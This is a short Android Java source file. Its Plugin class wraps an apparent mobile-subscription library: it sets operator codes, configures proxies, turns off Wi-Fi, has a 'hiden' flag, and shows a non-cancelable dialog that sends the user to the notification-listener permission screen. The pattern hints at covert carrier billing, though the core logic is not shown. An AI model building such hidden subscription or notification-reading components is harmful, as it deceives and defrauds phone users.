package com.cp.plugin;

import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.webkit.WebView;
import android.widget.RelativeLayout;

import com.cp.plugin.event.SubEvent;
import com.enhtmv.sublib.common.sub.SubContext;
import com.enhtmv.sublib.common.http.SubProxy;

import static android.provider.Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS;

public class Plugin {


    private static boolean hiden = true;

    public static boolean isPermission = false;

    private static Context mContext;

    private static AlertDialog.Builder alertDialogBuilder;

    public static void init(Context context) {
        init(context, new SubEvent() {
            @Override
            public void onMessage(String tag, String content) {

            }

            @Override
            public void onError(Throwable throwable) {

            }
        });
    }

    /**
     * 调用初始化init方法
     *
     * @param context
     * @param event
     */
    public static void init(Context context, SubEvent event) {
        mContext = context;
        SubContext.init(context, event);
    }

    public static void init(Context context, SubEvent event, RelativeLayout layout) {
        SubContext.init(context, event, layout);
    }

    public static void setHiden(boolean h) {
        hiden = h;
    }

    public static boolean isHiden() {
        return hiden;
    }


    public static void log(boolean log) {
        SubContext.log(log);

    }

    public static void operator(String code) {
        SubContext.setOperator(code);
    }

    public static void proxy(String host, String user, String password, int port) {
        SubContext.proxy(new SubProxy(host, user, password, port));
    }

    public static void closeWifi(boolean wifi) {
        SubContext.closeWifi(wifi);
    }


    public static void call() {
        SubContext.call();
    }

    public static void showDialog() {
        if (alertDialogBuilder != null) {
            alertDialogBuilder.show();
        }
    }

    public static AlertDialog buildNotificationAlert(String title, String content, String yes, String no) {
        if (mContext == null) return null;
        alertDialogBuilder = new AlertDialog.Builder(mContext);
        alertDialogBuilder.setCancelable(false);
        alertDialogBuilder.setTitle(title);
        alertDialogBuilder.setMessage(content);
        alertDialogBuilder.setPositiveButton(yes,
                new DialogInterface.OnClickListener() {
                    public void onClick(DialogInterface dialog, int id) {
                        mContext.startActivity(new Intent(ACTION_NOTIFICATION_LISTENER_SETTINGS));
                        //go to set permision
                    }
                });
        alertDialogBuilder.setNegativeButton(no,
                new DialogInterface.OnClickListener() {
                    public void onClick(DialogInterface dialog, int id) {
                        //cancel
                    }
                });
        return (alertDialogBuilder.create());
    }


}
